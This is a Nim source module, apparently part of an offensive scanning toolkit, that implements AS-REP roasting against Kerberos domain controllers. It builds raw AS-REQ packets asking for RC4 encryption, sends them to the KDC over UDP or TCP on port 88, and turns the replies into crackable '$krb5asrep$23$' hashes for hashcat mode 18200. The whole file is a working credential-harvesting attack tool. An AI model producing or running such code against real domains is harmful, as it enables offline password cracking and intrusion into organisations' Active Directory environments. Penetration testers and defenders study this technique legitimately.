import std/[asyncdispatch, asyncnet, net, random, strutils, times]
import ../../core/scanner as scannercore
import ../../core/proxy as netproxy

type
  AsrepResult* = object
    success*: bool
    user*: string
    realm*: string
    hash*: string
    message*: string

  Tlv = object
    tag: int
    body: string
    next: int

proc addBytes(data: var string; bytes: openArray[byte]) =
  for b in bytes:
    data.add char(b)

proc addU32Be(data: var string; value: uint32) =
  data.add char((value shr 24) and 0xff)
  data.add char((value shr 16) and 0xff)
  data.add char((value shr 8) and 0xff)
  data.add char(value and 0xff)

proc readU32Be(data: string; offset: int): uint32 =
  if offset + 4 > data.len: return 0
  (uint32(ord(data[offset])) shl 24) or
    (uint32(ord(data[offset + 1])) shl 16) or
    (uint32(ord(data[offset + 2])) shl 8) or
    uint32(ord(data[offset + 3]))

proc derLen(length: int): string =
  if length < 0x80:
    result.add char(length)
  else:
    var tmp: seq[byte]
    var value = length
    while value > 0:
      tmp.insert(byte(value and 0xff), 0)
      value = value shr 8
    result.add char(0x80 or tmp.len)
    result.addBytes tmp

proc tlv(tag: int; body: string): string =
  result.add char(tag)
  result.add derLen(body.len)
  result.add body

proc seqT(body: string): string = tlv(0x30, body)
proc ctx(n: int; body: string): string = tlv(0xa0 + n, body)
proc app(n: int; body: string): string = tlv(0x60 + n, body)
proc genStr(value: string): string = tlv(0x1b, value)
proc octet(value: string): string = tlv(0x04, value)
proc boolT(value: bool): string = tlv(0x01, if value: "\xff" else: "\x00")

proc derInt(value: int): string =
  var bytes: seq[byte]
  var v = value
  if v == 0:
    bytes.add 0
  else:
    while v > 0:
      bytes.insert(byte(v and 0xff), 0)
      v = v shr 8
    if (bytes[0] and 0x80) != 0:
      bytes.insert(0, 0)
  result.add char(0x02)
  result.add derLen(bytes.len)
  result.addBytes bytes

proc kerberosTime(offsetSeconds = 86400): string =
  let t = fromUnix(getTime().toUnix() + offsetSeconds)
  let utc = t.utc
  tlv(0x18, utc.format("yyyyMMddHHmmss") & "Z")

proc bitString(bytes: openArray[byte]): string =
  result.add char(0x03)
  result.add derLen(bytes.len + 1)
  result.add char(0)
  result.addBytes bytes

proc principal(nameType: int; parts: seq[string]): string =
  var names = ""
  for part in parts:
    names.add genStr(part)
  seqT(ctx(0, derInt(nameType)) & ctx(1, seqT(names)))

proc buildAsReq(user, realm: string): string =
  randomize()
  let upperRealm = realm.toUpperAscii()
  let opts = bitString([byte 0x50, 0x80, 0x00, 0x10])
  let nonce = rand(0x7fffffff)
  let etypes = seqT(derInt(23))
  let pacRequest = seqT(ctx(0, boolT(true)))
  let paData = seqT(ctx(1, derInt(128)) & ctx(2, octet(pacRequest)))
  let body = seqT(
    ctx(0, opts) &
    ctx(1, principal(1, @[user])) &
    ctx(2, genStr(upperRealm)) &
    ctx(3, principal(2, @["krbtgt", upperRealm])) &
    ctx(5, kerberosTime()) &
    ctx(7, derInt(nonce)) &
    ctx(8, etypes)
  )
  app(10, seqT(ctx(1, derInt(5)) & ctx(2, derInt(10)) &
    ctx(3, seqT(paData)) & ctx(4, body)))

proc readTlv(data: string; offset = 0): Tlv =
  if offset + 2 > data.len:
    return Tlv(tag: -1, next: data.len)
  result.tag = ord(data[offset])
  var pos = offset + 1
  var length = ord(data[pos])
  inc pos
  if (length and 0x80) != 0:
    let count = length and 0x7f
    length = 0
    if pos + count > data.len:
      return Tlv(tag: -1, next: data.len)
    for i in 0 ..< count:
      length = (length shl 8) or ord(data[pos + i])
    pos += count
  if pos + length > data.len:
    return Tlv(tag: -1, next: data.len)
  result.body = data[pos ..< pos + length]
  result.next = pos + length

proc children(data: string): seq[Tlv] =
  var pos = 0
  while pos < data.len:
    let item = readTlv(data, pos)
    if item.tag < 0 or item.next <= pos:
      break
    result.add item
    pos = item.next

proc intValue(data: string): int =
  let t = readTlv(data)
  if t.tag != 0x02: return 0
  for ch in t.body:
    result = (result shl 8) or ord(ch)

proc hexByte(value: int): string =
  const digits = "0123456789abcdef"
  result.add digits[(value shr 4) and 0xf]
  result.add digits[value and 0xf]

proc toHex(data: string): string =
  for ch in data:
    result.add hexByte(ord(ch))

proc parseEncryptedData(data: string): tuple[etype: int; cipher: string] =
  let outer = readTlv(data)
  let body = if outer.tag == 0x30: outer.body else: data
  for field in children(body):
    case field.tag
    of 0xa0:
      result.etype = intValue(field.body)
    of 0xa2:
      let c = readTlv(field.body)
      if c.tag == 0x04:
        result.cipher = c.body
    else:
      discard

proc parseKrbError(data: string): string =
  let top = readTlv(data)
  if top.tag != 0x7e:
    return "KDC returned KRB-ERROR"
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    return "KDC returned malformed KRB-ERROR"
  var code = -1
  var text = ""
  for field in children(seq.body):
    case field.tag
    of 0xa6:
      code = intValue(field.body)
    of 0xab:
      let t = readTlv(field.body)
      if t.tag == 0x1b or t.tag == 0x1c:
        text = t.body
    else:
      discard
  if code >= 0 and text.len > 0:
    "KDC error " & $code & ": " & text
  elif code >= 0:
    "KDC error " & $code
  else:
    "KDC returned KRB-ERROR"

proc krbErrorCode(data: string): int =
  let top = readTlv(data)
  if top.tag != 0x7e: return -1
  let seq = readTlv(top.body)
  if seq.tag != 0x30: return -1
  for field in children(seq.body):
    if field.tag == 0xa6:
      return intValue(field.body)
  -1

proc requestTcp(kdc: string; payload: string; timeoutMs: int): Future[string] {.async.} =
  var socket: AsyncSocket
  try:
    socket = scannercore.newTcpAsyncSocket(kdc)
    let connected = await netproxy.connectTcp(socket, kdc, 88, timeoutMs)
    if not connected:
      return ""
    var framed = ""
    framed.addU32Be(payload.len.uint32)
    framed.add payload
    await socket.send(framed)
    var header = ""
    let deadline = epochTime() + timeoutMs.float / 1000.0
    while header.len < 4:
      let remaining = int((deadline - epochTime()) * 1000)
      if remaining <= 0: return ""
      let fut = socket.recv(4 - header.len)
      if not await withTimeout(fut, remaining): return ""
      let chunk = await fut
      if chunk.len == 0: return ""
      header.add chunk
    let totalLen = int(readU32Be(header, 0))
    while result.len < totalLen:
      let remaining = int((deadline - epochTime()) * 1000)
      if remaining <= 0: return ""
      let fut = socket.recv(totalLen - result.len)
      if not await withTimeout(fut, remaining): return ""
      let chunk = await fut
      if chunk.len == 0: return ""
      result.add chunk
  except CatchableError:
    result = ""
  finally:
    if socket != nil:
      try: socket.close()
      except CatchableError: discard

proc parseAsrepHash(data, user, realm: string): tuple[ok: bool; hash: string; message: string] =
  let top = readTlv(data)
  if top.tag == 0x7e:
    return (false, "", parseKrbError(data))
  if top.tag != 0x6b:
    return (false, "", "KDC did not return AS-REP")
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    return (false, "", "malformed AS-REP")
  var enc = ""
  for field in children(seq.body):
    if field.tag == 0xa6:
      enc = field.body
      break
  if enc.len == 0:
    return (false, "", "AS-REP missing encrypted part")
  let ed = parseEncryptedData(enc)
  if ed.etype != 23:
    return (false, "", "AS-REP etype " & $ed.etype & " is not hashcat mode 18200/etype 23")
  if ed.cipher.len <= 16:
    return (false, "", "AS-REP cipher too short")
  let checksum = ed.cipher[0 ..< 16]
  let cipher = ed.cipher[16 .. ^1]
  let principal = user & "@" & realm.toUpperAscii()
  (true, "$krb5asrep$23$" & principal & ":" & toHex(checksum) & "$" & toHex(cipher),
    "AS-REP hash retrieved")

proc requestAsrepHash*(kdc, realm, user: string; timeoutMs = 5000): Future[AsrepResult] {.async.} =
  result = AsrepResult(user: user, realm: realm.toUpperAscii())
  var socket: AsyncSocket
  try:
    socket = newAsyncSocket(Domain.AF_INET, SockType.SOCK_DGRAM, Protocol.IPPROTO_UDP)
    let payload = buildAsReq(user, realm)
    await socket.sendTo(scannercore.resolveHost(kdc), Port(88), payload)
    let recvFuture = socket.recvFrom(8192)
    if not await withTimeout(recvFuture, timeoutMs):
      result.message = "KDC timeout"
      return
    let packet = await recvFuture
    var response = packet.data
    if krbErrorCode(response) == 52:
      let tcpResponse = await requestTcp(kdc, payload, timeoutMs)
      if tcpResponse.len > 0:
        response = tcpResponse
    let parsed = parseAsrepHash(response, user, realm)
    result.success = parsed.ok
    result.hash = parsed.hash
    result.message = parsed.message
  except CatchableError as error:
    result.message = error.msg.splitLines()[0]
  finally:
    if socket != nil:
      try: socket.close()
      except CatchableError: discard
